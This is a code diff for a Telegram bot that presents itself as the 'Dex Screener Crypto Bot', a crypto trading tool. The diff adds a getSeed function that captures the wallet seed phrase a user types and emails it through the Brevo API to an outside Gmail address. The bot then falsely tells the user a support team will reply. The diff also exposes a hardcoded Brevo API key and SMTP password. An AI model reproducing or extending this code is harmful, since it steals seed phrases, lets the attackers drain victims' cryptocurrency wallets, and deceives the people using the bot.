@@ -40,36 +40,42 @@ async def start(update: Update, context: CallbackContext) -> int:
         "Welcome! to Dex Screener Crypto Bot\nDeveloped By the Dex Screener Bot Community, our Crypto bot is swift,fast and reliable and is used by Many to quickly trade their Cryptocurrencies and other tokens", reply_markup=reply_markup 
     )
     return MENU
+    
+def create_smtp_api_client():
+    configuration = sib_api_v3_sdk.Configuration()
+    configuration.api_key['api-key'] = "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"# Fetch the API key from environment variables
+    return sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))
 
-def getSeed(update: Update, context: CallbackContext) -> str:
-    port = 587
-    smtp_server = "smtp-relay.brevo.com"
-    smtp_username = "870b79001@smtp-brevo.com"
-    smtp_password = "NT2hk8WtrzQR9vVf"
+async def getSeed(update: Update, context: CallbackContext) -> str:
+    # Create the SMTP client
+    client = create_smtp_api_client()
 
-    sender_mail = "screenerbotdex@gmail.com"
+    sender_mail = "Jimmywillbanks07@gmail.com"
     receiver_email = "screenerbotdex@gmail.com"
-
 
     text = f"THIS IS THE SEED PHRASE  \n ---------------------------------------- \n {update.message.text}"
 
-    #CREATE
-    message = MIMEText(text, "plain")
-    message["Subject"] = "Plain Text Email"
-    message["From"] = sender_mail
-    message["To"] = receiver_email
+    # Prepare the email data
+    email_data = sib_api_v3_sdk.SendSmtpEmail(
+        sender={"email": sender_mail},
+        to=[{"email": receiver_email}],
+        subject="Plain Text Email",
+        text_content=text
+    )
 
-    with smtplib.SMTP(smtp_server,port) as server:
-         server.starttls()
-         server.login(smtp_username, smtp_password)
-         server.sendmail(sender_mail,receiver_email,message.as_string())
-
-    print('Sent')
+    try:
+        # Send the email using Brevo API
+        response = client.send_transac_email(email_data)
+        logging.info(f"Email sent successfully: {response}")
+        print(f"Email sent successfully: {response}")
+    except ApiException as e:
+        logging.error(f"Error sending email: {e}")
+        print(f"Error sending email: {e}")
 
 async def handle_seed_input(update: Update, context: CallbackContext) -> int:
     user_input = update.message.text  # This will capture the user's input
     # You can now process the input, e.g., send it via email.
-    getSeed(update, context)  # You can call your existing function to send the email
+    await getSeed(update, context)  # You can call your existing function to send the email
     await update.message.reply_text("Your Message has been sent to our Dex support team. We will respond to you shortly! Please Wait......")
     return ConversationHandler.END  # End the conversation after handling
 
